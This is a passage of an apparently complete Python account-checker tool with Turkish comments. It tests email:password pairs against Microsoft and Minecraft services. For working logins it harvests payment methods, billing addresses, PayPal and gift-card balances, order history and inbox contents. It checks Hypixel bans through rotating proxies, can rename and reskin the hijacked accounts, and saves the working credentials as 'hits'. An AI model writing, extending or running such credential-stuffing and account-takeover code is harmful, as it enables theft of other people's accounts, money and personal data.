                        ui.log_info(f"Donut SMP: preflight {r.status_code}{(' (no proxy)' if p is None else '')}")
                except Exception as e:
                    if UI_ENABLED and ui:
                        ui.log_info(f"Donut SMP: preflight failed {('(no proxy)' if p is None else '')} - {e.__class__.__name__}: {str(e)[:160]}")
            if not valid_proxies:
                valid_proxies = [None]
            response = None
            for idx, p in enumerate(valid_proxies):
                try:
                    r = session.get(f'{donut_api_url}{self.name}', headers=headers, proxies=p, verify=False, timeout=20)
                    time.sleep(0.3 * (idx + 1))
                    if r.status_code == 200 or r.status_code in (401, 404, 429):
                        response = r
                        break
                    else:
                        if UI_ENABLED and ui:
                            ui.log_info(f"Donut SMP: server error {r.status_code} on attempt {idx + 1}{(' (no proxy)' if p is None else '')}")
                        continue
                except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.RetryError, requests.exceptions.ProxyError, requests.exceptions.SSLError, requests.exceptions.InvalidSchema) as e:
                    if UI_ENABLED and ui:
                        ui.log_info(f"Donut SMP: connection failed on attempt {idx + 1}{(' (no proxy)' if p is None else '')} - {e.__class__.__name__}: {str(e)[:160]}")
                    continue
            if response is None:
                if UI_ENABLED and ui:
                    ui.log_info('Donut SMP API: Connection failed after retries')
                return
            if response.status_code == 200:
                try:
                    data = response.json()
                except Exception:
                    data = None
                stats_data = None
                if isinstance(data, dict):
                    if 'result' in data and isinstance(data['result'], dict):
                        stats_data = data['result']
                if isinstance(stats_data, dict):
                    stats_lines = []
                    stats_lines.append(f'{self.email}:{self.password}')
                    stats_lines.append(f'Username: {self.name}')
                    if stats_data.get('broken_blocks'):
                        stats_lines.append(f"broken_blocks: {stats_data['broken_blocks']}")
                    if stats_data.get('deaths'):
                        stats_lines.append(f"deaths: {stats_data['deaths']}")
                    if stats_data.get('kills'):
                        stats_lines.append(f"kills: {stats_data['kills']}")
                    if stats_data.get('mobs_killed'):
                        stats_lines.append(f"mobs_killed: {stats_data['mobs_killed']}")
                    if stats_data.get('money'):
                        stats_lines.append(f"money: {stats_data['money']}")
                    if stats_data.get('money_made_from_sell'):
                        stats_lines.append(f"money_made_from_sell: {stats_data['money_made_from_sell']}")
                    if stats_data.get('money_spent_on_shop'):
                        stats_lines.append(f"money_spent_on_shop: {stats_data['money_spent_on_shop']}")
                    if stats_data.get('placed_blocks'):
                        stats_lines.append(f"placed_blocks: {stats_data['placed_blocks']}")
                    if stats_data.get('playtime'):
                        try:
                            raw_playtime = stats_data['playtime']
                            formatted_playtime = self._format_seconds(raw_playtime)
                            stats_lines.append(f'playtime: {raw_playtime} ({formatted_playtime})')
                        except Exception:
                            stats_lines.append(f"playtime: {stats_data['playtime']}")
                    if self.banned is not None:
                        if self.banned and self.banned != 'False':
                            stats_lines.append('banned: true')
                            _bstr = str(self.banned or '')
                            if '[Error]' in _bstr or _bstr in ('Error','[Error]'):
                                stats_lines.append('ban_duration: N/A (check error)')
                            elif _bstr not in ('True','true','1',''):
                                try:
                                    _bi = self._parse_ban_info(_bstr)
                                    if _bi.get('ban_id'): stats_lines.append(f"ban_id: {_bi['ban_id']}")
                                    stats_lines.append(f"ban_duration: {_bi.get('duration','Unknown')}")
                                except Exception:
                                    stats_lines.append('ban_duration: Parse Error')
                            else:
                                stats_lines.append('ban_duration: Permanent/Unknown')
                        else:
                            stats_lines.append('banned: false')
                    # Anlamlı veri varsa kaydet (sadece email+user değilse)
                    _has_real_data = any(
                        l.startswith(('broken_blocks:','deaths:','kills:','mobs_killed:','money:','placed_blocks:','playtime:','banned:'))
                        and not l.endswith(': 0')
                        for l in stats_lines
                    )
                    if len(stats_lines) > 2 and _has_real_data:
                        with file_lock:
                            with open(f'results/{fname}/donut_stats.txt', 'a', encoding='utf-8') as f:
                                f.write('\n'.join(stats_lines))
                                f.write('\n' + '=' * 50 + '\n')
                        if UI_ENABLED and ui:
                            ui.log_info(f'Donut SMP stats saved for {self.name}')
            elif response.status_code == 404:
                if UI_ENABLED and ui:
                    ui.log_info('Donut SMP: player not found')
            elif response.status_code == 401:
                if UI_ENABLED and ui:
                    ui.log_info('Donut SMP API: Invalid API key')
            elif response.status_code == 429:
                if UI_ENABLED and ui:
                    ui.log_info('Donut SMP API: Rate limited')
        except requests.exceptions.RequestException as e:
            if 'Max retries exceeded' in str(e):
                if UI_ENABLED and ui:
                    ui.log_info('Donut SMP API: Connection failed after retries')
            elif 'Connection' in str(e) or 'Timeout' in str(e):
                if UI_ENABLED and ui:
                    ui.log_info('Donut SMP API: Connection timeout')
            elif UI_ENABLED and ui:
                ui.log_info('Donut SMP API: Request failed')
        except Exception as e:
            if UI_ENABLED and ui:
                ui.log_info(f'Donut SMP error: {str(e)[:100]}')
    def check_microsoft_features(self):
        global retries
        try:
            if config.get('check_microsoft_balance') or config.get('check_rewards_points', True) or config.get('check_payment_methods') or config.get('check_subscriptions') or config.get('check_orders') or config.get('check_billing_address') or config.get('scan_inbox'):
                results = check_microsoft_account(self.session, self.email, self.password, config, fname)
                self.ms_balance = results.get('balance')
                self.ms_rewards = results.get('rewards_points')
                self.ms_payment_methods = results.get('payment_methods', [])
                self.ms_orders = results.get('orders', [])
                self.inbox_matches     = results.get('inbox_results', [])
                self.ms_recovery_email = results.get('recovery_email')
                self.ms_phone_hint     = results.get('ms_phone_hint')
        except Exception as e:
            retries += 1
    def ban(self, session):
        global errors
        if not MINECRAFT_AVAILABLE:
            self.banned = '[Error] pyCraft Missing'
            return
        if not config.get('hypixelban'):
            return
        if self.ban_checked:
            return
        self.ban_checked = True
        try:
            auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
            auth_token.profile = Profile(id_=self.uuid, name=self.name)
            tries = 0
            while tries < maxretries:
                connection = Connection('mc.hypixel.net', 25565, auth_token=auth_token, initial_version=47, allowed_versions={'1.8', 47})
                
                original_handle_exception = connection._handle_exception
                def safe_handle_exception(e, exc_info):
                    try:
                        error_str = str(e)
                        if 'RateLimiter disallowed' in error_str or '429' in error_str:
                            try:
                                self.banned = '[Error] Rate Limit'
                            except:
                                pass
                            return
                        if 'SSLError' in error_str or 'EOF occurred' in error_str:
                             try:
                                 self.banned = '[Error] Connection/SSL'
                             except:
                                 pass
                             return
                        if isinstance(e, ConnectionAbortedError) or isinstance(e, ConnectionResetError) or (isinstance(e, OSError) and hasattr(e, 'winerror') and e.winerror == 10053):
                            return
                        if isinstance(e, AttributeError) and "'NoneType' object has no attribute 'send'" in error_str:
                            return
                        if isinstance(e, ValueError) and "closed file" in error_str:
                            return
                        if isinstance(e, requests.exceptions.RequestException):
                            try:
                                 self.banned = '[Error] Connection'
                            except:
                                 pass
                            return
                        if 'multiplayer.access.banned' in error_str or (MINECRAFT_AVAILABLE and isinstance(e, YggdrasilError)):
                             try:
                                 self.banned = f"[Ban] {error_str}"
                             except:
                                 pass
                             return
                    except:
                        pass
                    original_handle_exception(e, exc_info)
                connection._handle_exception = safe_handle_exception
                
                @connection.listener(clientbound_login.DisconnectPacket, early=True)
                def login_disconnect(packet):
                    try:
                        data = json.loads(str(packet.json_data))
                        data_str = str(data)
                        if 'temporarily banned' in data_str:
                            try:
                                duration = data['extra'][4]['text'].strip()
                                ban_id = data['extra'][8]['text'].strip()
                                self.banned = f"[{data['extra'][1]['text']}] {duration} Ban ID: {ban_id}"
                            except:
                                self.banned = "Temporarily Banned"
                            write_dedupe(fname, 'Banned.txt', f'{self.email}:{self.password}\n')
                            if UI_ENABLED and ui:
                                ui.increment_stat('banned')
                        elif 'Suspicious activity' in data_str:
                            try:
                                ban_id = data['extra'][6]['text'].strip()
                                self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {ban_id}"
                            except:
                                self.banned = "[Permanently] Suspicious activity"
                            write_dedupe(fname, 'Banned.txt', f'{self.email}:{self.password}\n')
                            if UI_ENABLED and ui:
                                ui.increment_stat('banned')
                        elif 'You are permanently banned from this server!' in data_str:
                            try:
                                reason = data['extra'][2]['text'].strip()
                                ban_id = data['extra'][6]['text'].strip()
                                self.banned = f"[Permanently] {reason} Ban ID: {ban_id}"
                            except:
                                self.banned = "[Permanently] Banned"
                            write_dedupe(fname, 'Banned.txt', f'{self.email}:{self.password}\n')
                            if UI_ENABLED and ui:
                                ui.increment_stat('banned')
                        elif 'The Hypixel Alpha server is currently closed!' in data_str:
                            self.banned = 'False'
                            write_dedupe(fname, 'Unbanned.txt', f'{self.email}:{self.password}\n')
                            if UI_ENABLED and ui:
                                ui.increment_stat('unbanned')
                        elif 'Failed cloning your SkyBlock data' in data_str:
                            self.banned = 'False'
                            write_dedupe(fname, 'Unbanned.txt', f'{self.email}:{self.password}\n')
                            if UI_ENABLED and ui:
                                ui.increment_stat('unbanned')
                        else:
                            extra_list = data.get('extra', [])
                            full_msg = "".join([x.get('text', '') for x in extra_list if isinstance(x, dict)])
                            if not full_msg:
                                full_msg = data.get('text', '')
                            self.banned = full_msg if full_msg else str(data)
                            write_dedupe(fname, 'Banned.txt', f'{self.email}:{self.password}\n')
                            if UI_ENABLED and ui:
                                ui.increment_stat('banned')
                    except Exception as e:
                        self.banned = f"Error parsing ban: {str(e)}"
                
                @connection.listener(clientbound_play.DisconnectPacket, early=True)
                def play_disconnect(packet):
                    login_disconnect(packet)

                def _mark_unbanned(packet_name):
                    if self.banned is None:
                        self.banned = 'False'
                        write_dedupe(fname, 'Unbanned.txt', f'{self.email}:{self.password}\n')
                        if UI_ENABLED and ui:
                            ui.increment_stat('unbanned')
                            ui.log_info(f'Unbanned detected ({packet_name}): {self.name}')
                        def delayed_disconnect():
                            time.sleep(1.0)
                            connection.disconnect()
                        threading.Thread(target=delayed_disconnect).start()
                @connection.listener(clientbound_play.JoinGamePacket, early=True)
                def joined_server(packet):
                    _mark_unbanned('JoinGame')
                @connection.listener(clientbound_play.KeepAlivePacket, early=True)
                def keep_alive(packet):
                    _mark_unbanned('KeepAlive')
                @connection.listener(clientbound_play.PlayerPositionAndLookPacket, early=True)
                def position_look(packet):
                    _mark_unbanned('PosLook')
                @connection.listener(clientbound_play.TimeUpdatePacket, early=True)
                def time_update(packet):
                    _mark_unbanned('TimeUpdate')
                @connection.listener(clientbound_play.RespawnPacket, early=True)
                def respawn(packet):
                    _mark_unbanned('Respawn')
                try:
                    try:
                        connected = False
                        if len(banproxies) > 0:
                            with proxy_lock:
                                proxy = random.choice(banproxies)
                                if '@' in proxy:
                                    atsplit = proxy.split('@')
                                    socks.set_default_proxy(socks.SOCKS5, addr=atsplit[1].split(':')[0], port=int(atsplit[1].split(':')[1]), username=atsplit[0].split(':')[0], password=atsplit[0].split(':')[1])
                                else:
                                    ip_port = proxy.split(':')
                                    socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]))
                                socket.socket = socks.socksocket
                                connection.connect()
                        else:
                            connection.connect()

                        connected = True
                        c = 0
                        while self.banned == None and c < 3000:
                            time.sleep(0.01)
                            c += 1
                        connection.disconnect()
                    except:
                        pass
                    
                    if self.banned is None:
                        self.banned = '[Error] Connection Timeout/No Packet'

                    if self.banned and str(self.banned).startswith('[Error]'):
                        if tries < maxretries - 1:
                            self.banned = None
                            time.sleep(1)
                            tries += 1
                            continue

                    if self.banned != None:
                        break
                    tries += 1
                except Exception:
                    pass
        except Exception:
            errors += 1
    def setname(self):
        name_format = config.get('name')
        newname = name_format
        while '{random_letter}' in newname:
            newname = newname.replace('{random_letter}', random.choice(string.ascii_lowercase), 1)
        while '{random_number}' in newname:
            newname = newname.replace('{random_number}', random.choice(string.digits), 1)
        while '{random_string}' in newname:
            newname = newname.replace('{random_string}', ''.join(random.choices(string.ascii_lowercase + string.digits, k=3)), 1)
        if newname == name_format and len(newname) < 13:
            newname = f"{newname}_{''.join(random.choices(string.ascii_lowercase + string.digits, k=3))}"
        tries = 0
        while tries < maxretries:
            try:
                changereq = self.session.put('https://api.minecraftservices.com/minecraft/profile/name/' + newname, headers={'Authorization': f'Bearer {self.token}'})
                if changereq.status_code == 200:
                    self.type = self.type + ' [SET MC]'
                    self.name = self.name + f' -> {newname}'
                    break
                elif changereq.status_code == 429:
                    time.sleep(0.5)
            except:
                pass
            tries += 1
    def setskin(self):
        tries = 0
        while tries < maxretries:
            try:
                data = {'url': config.get('skin'), 'variant': config.get('variant')}
                changereq = self.session.post('https://api.minecraftservices.com/minecraft/profile/skins', json=data, headers={'Authorization': f'Bearer {self.token}', 'Content-Type': 'application/json'})
                if changereq.status_code == 200:
                    self.type = self.type + ' [SET SKIN]'
                    break
                elif changereq.status_code == 429:
                    time.sleep(0.5)
            except:
                pass
            tries += 1
    def build_json_capture(self):
        capture_data = {'username': self.name if self.name != 'N/A' else '', 'hypixel_rank': self.hypixl if self.hypixl else 'N/A', 'email': self.email, 'password': self.password, 'account_type': self.type, 'first_login': self.firstlogin if self.firstlogin else '', 'last_login': self.lastlogin if self.lastlogin else '', 'hypixel_level': float(self.level) if self.level else 0.0, 'bedwars_stars': int(self.bwstars) if self.bwstars else 0, 'skyblock_coins': self.sbcoins if self.sbcoins else 'N/A', 'capes': self.capes.split(', ') if self.capes and self.capes != '' else [], 'optifine_cape': True if self.cape == 'Yes' else False, 'can_change_name': True if self.namechanged == 'True' else False, 'last_name_change': self.lastchanged if self.lastchanged else '', 'banned': True if self.banned and self.banned != 'False' else False}
        if capture_data['banned']:
            ban_info = self._parse_ban_info(self.banned)
            if ban_info.get('ban_id'):
                capture_data['ban_id'] = ban_info['ban_id']
            if ban_info.get('duration'):
                capture_data['ban_duration'] = ban_info['duration']
        return capture_data
    def _parse_ban_info(self, ban_text):
        ban_info = {}
        if not ban_text or not isinstance(ban_text, str):
            return ban_info
        ban_id_match = re.search('Ban ID: ([A-Za-z0-9]+)', ban_text)
        if ban_id_match:
            ban_info['ban_id'] = ban_id_match.group(1)
        if 'Permanently' in ban_text or 'permanently' in ban_text:
            ban_info['duration'] = 'Permanently'
            ban_info['ban_days'] = None
        else:
            duration_match = re.search('\\[([^\\]]+)\\]', ban_text)
            if duration_match:
                duration_text = duration_match.group(1)
                if 'Permanently' not in duration_text and 'permanently' not in duration_text:
                    ban_days = self._duration_to_days(duration_text)
                    if ban_days is not None:
                        ban_info['ban_days'] = ban_days
                        ban_info['duration'] = self._format_duration_short(duration_text, ban_days)
                    else:
                        ban_info['duration'] = duration_text
        if 'Suspicious activity' in ban_text:
            ban_info['reason'] = 'Suspicious activity'
        ban_info['full_message'] = ban_text
        return ban_info
    def _format_duration_short(self, original_text, total_days):
        try:
            text_lower = original_text.lower()
            hour_matches = re.findall('(\\d+)\\s*(?:hour|hours|h)\\b', text_lower)
            if hour_matches and 'day' not in text_lower and ('week' not in text_lower) and ('month' not in text_lower):
                total_hours = sum((int(h) for h in hour_matches))
                return f'{total_hours}h'
            week_matches = re.findall('(\\d+)\\s*(?:week|weeks|w)\\b', text_lower)
            if week_matches and 'day' not in text_lower and ('month' not in text_lower):
                total_weeks = sum((int(w) for w in week_matches))
                return f'{total_weeks}w'
            month_matches = re.findall('(\\d+)\\s*(?:month|months|mo|m)\\b', text_lower)
            if month_matches and 'week' not in text_lower and ('day' not in text_lower):
                total_months = sum((int(m) for m in month_matches))
                if total_months == 1:
                    return '4w'
                return f'{total_months * 30}d'
            return f'{total_days}d'
        except:
            return original_text
    def _duration_to_days(self, text):
        if not text:
            return None
        try:
            text_lower = text.lower()
            total_days = 0
            day_matches = re.findall('(\\d+)\\s*(?:day|days|d)\\b', text_lower)
            for match in day_matches:
                total_days += int(match)
            week_matches = re.findall('(\\d+)\\s*(?:week|weeks|w)\\b', text_lower)
            for match in week_matches:
                total_days += int(match) * 7
            month_matches = re.findall('(\\d+)\\s*(?:month|months|mo|m)\\b', text_lower)
            for match in month_matches:
                total_days += int(match) * 30
            year_matches = re.findall('(\\d+)\\s*(?:year|years|y)\\b', text_lower)
            for match in year_matches:
                total_days += int(match) * 365
            if total_days == 0:
                hour_matches = re.findall('(\\d+)\\s*(?:hour|hours|h)\\b', text_lower)
                if hour_matches:
                    hours = sum((int(h) for h in hour_matches))
                    total_days = max(1, (hours + 23) // 24)
            return total_days if total_days > 0 else None
        except:
            return None
    def _format_seconds(self, seconds_value):
        try:
            total_seconds = int(seconds_value)
        except Exception:
            return str(seconds_value)
        if total_seconds < 0:
            total_seconds = 0
        days, rem = divmod(total_seconds, 86400)
        hours, rem = divmod(rem, 3600)
        minutes, seconds = divmod(rem, 60)
        parts = []
        if days:
            parts.append(f'{days}d')
        if hours:
            parts.append(f'{hours}h')
        if minutes:
            parts.append(f'{minutes}m')
        if not parts:
            parts.append(f'{seconds}s')
        return ' '.join(parts)
    def save_json_capture(self):
        try:
            json_data = self.build_json_capture()
            capture_file = os.path.join(f'results/{fname}', 'capture.txt')
            if os.path.exists(capture_file):
                try:
                    with open(capture_file, 'r', encoding='utf-8') as f:
                        all_captures = json.load(f)
                        if not isinstance(all_captures, list):
                            all_captures = []
                except:
                    all_captures = []
            else:
                all_captures = []
            all_captures.append(json_data)
            with open(capture_file, 'w', encoding='utf-8') as f:
                json.dump(all_captures, f, indent=2, ensure_ascii=False)
            if UI_ENABLED and ui:
                ui.log_info(f'Capture saved: {self.email}')
        except Exception as e:
            if UI_ENABLED and ui:
                ui.log_error(f'Failed to save capture: {str(e)[:50]}')
    def handle(self, session):
        global hits, minecraft_capes, optifine_capes, inbox_matches, name_changes, payment_methods, errors
        _has_name = bool(self.name and self.name != 'N/A')
        if _has_name:
            try:
                self.hypixel()
            except Exception:
                errors += 1
            try:
                self.optifine()
                if self.cape == 'Yes':
                    optifine_capes += 1
            except Exception:
                errors += 1
            if self.capes and self.capes != '':
                minecraft_capes += 1
            try:
                self.full_access()
            except Exception:
                errors += 1
            try:
                self.namechange()
                if self.namechange_available:
                    name_changes += 1
            except Exception:
                errors += 1
            try:
                self.ban(session)
            except Exception:
                errors += 1
            try:
                self.check_microsoft_features()
                if self.ms_payment_methods:
                    payment_methods += len(self.ms_payment_methods)
                if self.inbox_matches:
                    inbox_matches += len(self.inbox_matches)
            except Exception as e:
                errors += 1
            try:
                if self.name and self.name != 'N/A':
                    self.cubecraft_stats = fetch_cubecraft_stats(self.name)
                    if self.cubecraft_stats:
                        with stats_lock:
                            if UI_ENABLED and ui:
                                ui.stats['cubecraft'] = ui.stats.get('cubecraft',0) + 1
            except: pass
            try:
                if self.uuid and self.uuid != 'N/A':
                    self.lunar_stats = fetch_lunar_stats(self.uuid)
                    if self.lunar_stats:
                        with stats_lock:
                            if UI_ENABLED and ui:
                                ui.stats['lunar'] = ui.stats.get('lunar',0) + 1
            except: pass
            # ── Paralel API çağrıları (ThreadPool ile) ──────
            _uuid = self.uuid if (self.uuid and self.uuid != 'N/A') else None
            _name = self.name if (self.name and self.name != 'N/A') else None
            _email = self.email or ''
            import concurrent.futures as _cf
            _api_tasks = []
            if _uuid and config.get('check_capes_dev', True):     _api_tasks.append(('capes_dev',       fetch_capes_dev,           [_uuid]))
            if _uuid and config.get('check_labymod', True):       _api_tasks.append(('labymod_info',    fetch_labymod_profile,     [_uuid]))
            if _name and config.get('check_badlion', True):       _api_tasks.append(('badlion_info',    fetch_badlion_profile,     [_name]))
            if _uuid and config.get('check_tlauncher_cape', True):_api_tasks.append(('tlauncher_cape',  fetch_tlauncher_cape,      [_uuid]))
            if _uuid and config.get('check_5zig', True):          _api_tasks.append(('fivezig_cape',    fetch_5zig_cape,           [_uuid]))
            if _name and config.get('check_mineskin', True):      _api_tasks.append(('mineskin_info',   fetch_mineskin_info,       [_name]))
            if _name and config.get('check_mineplex', True):      _api_tasks.append(('mineplex_info',   fetch_mineplex_stats,      [_name]))
            if _name and config.get('check_wynncraft', True):     _api_tasks.append(('wynncraft_info',  fetch_wynncraft_stats,     [_name]))
            if _name and config.get('check_hive', True):          _api_tasks.append(('hive_info',       fetch_hive_stats,          [_name]))
            if _name and config.get('check_pika', True):          _api_tasks.append(('pika_info',       fetch_pika_stats,          [_name]))
            if _name and config.get('check_gommehd', True):       _api_tasks.append(('gommehd_info',   fetch_gommehd_stats,       [_name]))
            if _name and config.get('check_mineheroes', True):    _api_tasks.append(('mineheroes_info', fetch_mineheroes_stats,    [_name]))
            if _name and config.get('check_minemen', True):       _api_tasks.append(('minemen_info',    fetch_minemen_stats,       [_name]))
            if _name and config.get('check_slothpixel', True):    _api_tasks.append(('slothpixel_info', fetch_slothpixel_stats,    [_name]))
            if _email and config.get('check_github', True):       _api_tasks.append(('github_info',     fetch_github_by_email,     [_email]))
            if _uuid and config.get('check_cosmetica', True):     _api_tasks.append(('cosmetica_info',  fetch_cosmetica,           [_uuid]))
            if _uuid and config.get('check_essential', True):     _api_tasks.append(('essential_info',  fetch_essential_cosmetics, [_uuid]))
            if _uuid and config.get('check_mccapes', True):       _api_tasks.append(('mccapes_info',    fetch_minecraftcapes,      [_uuid]))
            if _uuid and config.get('check_quasar', True):        _api_tasks.append(('quasar_cape',     fetch_quasar_cape,         [_uuid]))
            if _name and config.get('check_feather', True):       _api_tasks.append(('feather_info',    fetch_feather_client,      [_name]))
            if _uuid and config.get('check_salwyrr', True):       _api_tasks.append(('salwyrr_info',    fetch_salwyrr,             [_uuid]))
            if _name and config.get('check_zeqa', True):          _api_tasks.append(('zeqa_info',       fetch_zeqa_stats,          [_name]))
            if _name and config.get('check_jartex', True):        _api_tasks.append(('jartex_info',     fetch_jartex_stats,        [_name]))
            if _name and config.get('check_galaxite', True):      _api_tasks.append(('galaxite_info',   fetch_galaxite_stats,      [_name]))
            if _name and config.get('check_name_history', True):  _api_tasks.append(('name_history',    fetch_name_history,        [_name]))
            if _email and config.get('check_breach', True):       _api_tasks.append(('breach_info',     check_breach_count,        [_email]))
            def _run_api(task):
                attr, fn, args = task
                try:
                    result = fn(*args)
                    if result is not None:
                        setattr(self, attr, result)
                except Exception:
                    pass
            if _api_tasks:
                with _cf.ThreadPoolExecutor(max_workers=min(len(_api_tasks), 12)) as _pool:
                    list(_pool.map(_run_api, _api_tasks))
            # slothpixel'dan bwstars + fk parse et
            try:
                if getattr(self, 'slothpixel_info', None):
                    import re as _re3
                    _si = str(self.slothpixel_info)
                    if not getattr(self, 'bwstars', None):
                        _bwm = _re3.search(r'BW\[.*?\*(\d+)', _si)
                        if _bwm: self.bwstars = int(_bwm.group(1))
                    _fkm = _re3.search(r'FK:(\d+(?:[KMkm\.]+)?)', _si)
                    if _fkm: self.bw_final_kills = _fkm.group(1)
                    _swm = _re3.search(r'SW\[Lvl:(\S+)', _si)
                    if _swm and not getattr(self,'sw',None): self.sw = _swm.group(1)
            except Exception: pass
            try:
                if not self.ms_balance or self.ms_balance in ('0.00 USD', 'None', None):
                    _mb = fetch_ms_balance_fixed(self.session)
                    if _mb: self.ms_balance = _mb
            except: pass
            # name_rarity, short_name, realms, domain, ntfy (API key gerektirmez)
            try: self.name_rarity = fetch_username_rarity(self.name)
            except: pass
            try: self.short_name_value = check_short_name_value(self.name)
            except: pass
            try:
                if config.get('check_realms', True):
                    self.realms_info = check_minecraft_realms(self.session)
            except: pass
            try: record_domain_result(self.email, True)
            except: pass
            try: send_ntfy_hit(self)
            except: pass
            try:
                self.og_name = detect_og_name(self.name)
            except: pass
            try:
                self.value_score = calculate_value_score(self)
                self.value_tier  = get_value_tier(self.value_score)
            except: pass
            try:
                if self.uuid and self.uuid != 'N/A':
                    self.skin_info = fetch_namemc_skin(self.name, self.uuid)
            except: pass
            try: self.cape_value_str = get_cape_value(self.capes)
            except: pass
            try: self.twofa_type = detect_2fa_type(self.session)
            except: pass
            try:
                if not self.ms_country:
                    self.ms_country = fetch_ms_country(self.session)
            except: pass
            try: self.sub_expiry = fetch_sub_expiry(self.session)
            except: pass
            try: self.xbox_gamertag = fetch_xbox_gamertag(self.session)
            except: pass
            try: self.alt_type = detect_alt_account(self.session)
            except: pass
            try: self.gift_card_bal = fetch_gift_card_balance(self.session)
            except: pass
            try: self.account_age = fetch_account_age(self.session)
            except: pass
            try:
                if self.name and self.name != 'N/A' and config.get('check_guild', True):
                    self.guild_info = fetch_hypixel_guild(self.name)
            except: pass
            try:
                _raw_capt = builder(self, mask_password=False)
                _ex = parse_extra_hypixel_stats(_raw_capt)
                if _ex.get('sw_prestige'): self.sw_prestige = _ex['sw_prestige']
                if _ex.get('mm_kills'):    self.mm_kills    = _ex['mm_kills']
                if _ex.get('mm_wins'):     self.mm_wins     = _ex['mm_wins']
                if _ex.get('bb_score'):    self.bb_score    = _ex['bb_score']
                if _ex.get('bb_wins'):     self.bb_wins     = _ex['bb_wins']
            except: pass
            try:
                if config.get('check_bedrock', True):
                    self.bedrock_info = fetch_bedrock_info(self.session)
            except: pass
            try:
                if self.name and self.name != 'N/A' and config.get('check_namemc_favs', True):
                    self.namemc_favs = fetch_namemc_favorites(self.name)
            except: pass
            try:
                if self.name and self.name != 'N/A' and config.get('check_optifine_detail', True):
                    self.optifine_detail = fetch_optifine_detail(self.name)
            except: pass
            try:
                if self.uuid and self.uuid != 'N/A':
                    self.crafatar_url = get_crafatar_url(self.uuid)
            except: pass
            try:
                if config.get('check_paypal_bal', True):
                    self.paypal_bal = fetch_paypal_balance(self.session)
            except: pass
            try:
                if self.payment_methods:
                    self.cc_types = parse_cc_types(str(self.payment_methods))
            except: pass
            try:
                if config.get('check_billing_detail', True):
                    _bd = fetch_billing_address_detail(self.session)
                    if _bd: self.billing_detail = _bd
            except: pass
            try:
                if config.get('check_active_subs', True):
                    self.active_subs = fetch_active_subscriptions(self.session)
            except: pass
            try:
                if config.get('check_order_history', True):
                    self.order_history = fetch_order_history(self.session)
            except: pass
            try:
                if config.get('check_linked_accounts', True):
                    self.linked_accounts = fetch_linked_accounts(self.session)
            except: pass
            try:
                if self.ms_reward_points and str(self.ms_reward_points) not in ('None','0',''):
                    self.ms_reward_points = points_to_money(self.ms_reward_points)
            except: pass
            try:
                if config.get('scan_imap', False) and self.email and self.password:
                    self.imap_results = scan_imap_inbox(self.email, self.password)
            except: pass
            try:
                self.value_score = calculate_value_score(self)
                self.value_tier  = get_value_tier(self.value_score)
            except: pass
            if config.get('setname'):
                try:
                    self.setname()
                except Exception as e:
                    if UI_ENABLED and ui:
                         ui.log_error(f"Setname error: {e}")
        else:
            try:
                self.setname()
            except Exception as e:
                if UI_ENABLED and ui:
                    ui.log_error(f"Setname error: {e}")
                pass
        try:
            self.check_donut_smp()
        except Exception as e:
            errors += 1
            if UI_ENABLED and ui:
                ui.log_info(f'Donut SMP error: {e}')
        if config.get('setskin'):
            try:
                self.setskin()
            except Exception as e:
                if UI_ENABLED and ui:
                     ui.log_error(f"Setskin error: {e}")
        # builder() meowapi stats ve extra fetch'lerden SONRA çağrılacak
        fullcapt    = f"{self.email}:{self.password}"  # fallback
        masked_capt = f"{self.email}:***"
        try:
            stats_text = fetch_meowapi_stats(self.name, self.uuid)
            if stats_text:
                sw = re.search(r'SW: (\d+)', stats_text)
                if sw: self.swstars = sw.group(1)
                
                nw = re.search(r'NW: ([^ ]+)', stats_text)
                if nw: self.sbnetworth = nw.group(1)
                
                purse = re.search(r'Purse: ([^ ]+)', stats_text)
                if purse: self.sbcoins = purse.group(1)
                
                pit = re.search(r'Pit_Gold: ([^ ]+)', stats_text)
                if pit: self.pitcoins = pit.group(1)
                
                # ── Tüm yeni fetch'ler builder'dan ÖNCE çalışmalı
                if not getattr(self,'skin_info',None):
                    try:
                        if self.uuid and self.uuid != 'N/A':
                            self.skin_info = fetch_namemc_skin(self.name, self.uuid)
                    except: pass
                if not getattr(self,'cape_value_str',None):
                    try: self.cape_value_str = get_cape_value(self.capes)
                    except: pass
                if not getattr(self,'twofa_type',None):
                    try: self.twofa_type = detect_2fa_type(self.session)
                    except: pass
                if not getattr(self,'ms_country',None):
                    try: self.ms_country = fetch_ms_country(self.session)
                    except: pass
                if not getattr(self,'sub_expiry',None):
                    try: self.sub_expiry = fetch_sub_expiry(self.session)
                    except: pass
                if not getattr(self,'xbox_gamertag',None):
                    try: self.xbox_gamertag = fetch_xbox_gamertag(self.session)
                    except: pass
                if not getattr(self,'alt_type',None):
                    try: self.alt_type = detect_alt_account(self.session)
                    except: pass
                if not getattr(self,'account_age',None):
                    try: self.account_age = fetch_account_age(self.session)
                    except: pass
                if not getattr(self,'guild_info',None):
                    try: self.guild_info = fetch_hypixel_guild(self.name)
                    except: pass
                if not getattr(self,'crafatar_url',None) and self.uuid and self.uuid != 'N/A':
                    try: self.crafatar_url = get_crafatar_url(self.uuid)
                    except: pass
                # ── Final value score (tüm verilerle)
                try:
                    self.value_score = calculate_value_score(self)
                    self.value_tier  = get_value_tier(self.value_score)
                except: pass
                fullcapt = self.builder(mask_password=False, include_timestamp=False)
                masked_capt = self.builder(mask_password=True, include_timestamp=True)
        except Exception:
            stats_text = None
            # meowapi başarısız olsa bile builder çağır
            try:
                self.value_score = calculate_value_score(self)
                self.value_tier  = get_value_tier(self.value_score)
            except: pass
            try:
                fullcapt    = self.builder(mask_password=False, include_timestamp=False)
                masked_capt = self.builder(mask_password=True, include_timestamp=True)
            except Exception as _be:
                fullcapt    = f'{self.email}:{self.password}'
                masked_capt = f'{self.email}:***'
        # ── name yoksa bile MS checks çalıştır
        if not _has_name:
            try: self.twofa_type = detect_2fa_type(self.session)
            except: pass
            try: self.ms_country = fetch_ms_country(self.session)
            except: pass
            try: self.sub_expiry = fetch_sub_expiry(self.session)
            except: pass
            try: self.account_age = fetch_account_age(self.session)
            except: pass
            try: self.alt_type = detect_alt_account(self.session)
            except: pass
            try:
                self.value_score = calculate_value_score(self)
                self.value_tier  = get_value_tier(self.value_score)
            except: pass
        try:
            write_dedupe(fname, 'Hits.txt', f'{self.email}:{self.password}\n')
            with stats_lock:
                hits += 1
        except Exception as e:
            if UI_ENABLED and ui:
                ui.log_error(f"Failed to write Hit: {e}")
